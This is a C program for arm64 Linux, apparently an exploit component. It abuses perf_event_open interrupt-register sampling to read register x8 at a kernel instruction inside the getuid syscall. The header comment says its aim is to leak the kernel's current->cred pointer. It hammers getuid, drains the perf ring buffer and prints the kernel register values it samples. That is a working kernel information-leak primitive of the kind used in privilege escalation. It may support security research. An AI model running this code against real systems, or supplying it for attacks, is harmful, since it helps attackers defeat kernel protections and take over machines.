/* Leak current->cred via PMU sampling of x8 at __arm64_sys_getuid+8. */
#define _GNU_SOURCE
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef __NR_perf_event_open
#define __NR_perf_event_open 241
#endif
#define PERF_TYPE_HARDWARE 0
#define PERF_COUNT_HW_CPU_CYCLES 0
#define PERF_SAMPLE_IP 1ULL
#define PERF_SAMPLE_REGS_INTR (1ULL << 18)
#define PERF_RECORD_SAMPLE 9

struct attr_min {
    uint32_t type, size;
    uint64_t config, sample_period, sample_type, read_format, flags;
    uint32_t wakeup_events, bp_type;
    uint64_t bp_addr, bp_len;
    uint64_t branch_sample_type, sample_regs_user;
    uint32_t sample_stack_user;
    int32_t clockid;
    uint64_t sample_regs_intr;
    uint32_t aux_watermark;
    uint16_t sample_max_stack, reserved2;
    uint32_t aux_sample_size, reserved3;
};

static volatile uint64_t *g_meta;
static unsigned char *g_data;
static uint64_t g_mask, g_tail, g_target;
static int g_hits, g_total;

static void drain(void) {
    uint64_t head = g_meta[1];
    while (g_tail < head) {
        unsigned char *rec = g_data + (g_tail & g_mask);
        uint32_t type;
        uint16_t size;
        memcpy(&type, rec, 4);
        memcpy(&size, rec + 6, 2);
        if (!size)
            break;
        if (type == PERF_RECORD_SAMPLE) {
            uint64_t ip, abi, x8;
            memcpy(&ip, rec + 8, 8);
            memcpy(&abi, rec + 16, 8);
            memcpy(&x8, rec + 24, 8);
            g_total++;
            if (ip >= g_target && ip <= g_target + 0x8) {
                if (g_hits < 8)
                    printf("HIT ip=%#llx abi=%#llx x8=%#llx\n",
                           (unsigned long long)ip, (unsigned long long)abi,
                           (unsigned long long)x8);
                g_hits++;
            }
        }
        g_tail += size;
    }
    g_meta[0] = g_tail;
}

int main(int argc, char **argv) {
    g_target = strtoull(argv[1], 0, 0);
    long period = argc > 2 ? atol(argv[2]) : 20000;
    int secs = argc > 3 ? atoi(argv[3]) : 5;
    struct attr_min a;
    memset(&a, 0, sizeof(a));
    a.type = PERF_TYPE_HARDWARE;
    a.size = 112;
    a.config = PERF_COUNT_HW_CPU_CYCLES;
    a.sample_period = (uint64_t)period;
    a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
    a.flags = 1ULL << 4;
    a.sample_regs_intr = 1ULL << 8; /* x8 */
    int fd = (int)syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
    if (fd < 0) {
        printf("perf: %s\n", strerror(errno));
        return 1;
    }
    size_t pg = 4096, pages = 128, ring_len = pg * (pages + 1);
    void *ring = mmap(NULL, ring_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    g_meta = (volatile uint64_t *)ring;
    g_data = (unsigned char *)ring + pg;
    g_mask = pg * pages - 1;
    g_tail = 0;

    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    unsigned long long loops = 0;
    for (;;) {
        for (int i = 0; i < 1000; i++)
            syscall(174); /* getuid */
        drain();
        loops++;
        clock_gettime(CLOCK_MONOTONIC, &t1);
        if (t1.tv_sec - t0.tv_sec >= secs)
            break;
    }
    drain();
    printf("target=%#llx hits=%d total=%d loops=%llu\n",
           (unsigned long long)g_target, g_hits, g_total, loops);
    return 0;
}
